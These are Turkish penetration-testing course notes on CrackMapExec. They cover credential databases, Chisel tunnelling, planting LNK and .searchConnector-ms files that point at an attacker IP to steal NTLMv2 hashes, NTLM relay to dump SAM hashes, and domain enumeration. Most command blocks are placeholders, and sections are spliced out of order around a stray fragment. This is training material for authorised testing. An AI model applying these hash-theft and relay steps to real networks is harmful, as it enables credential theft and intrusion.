Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
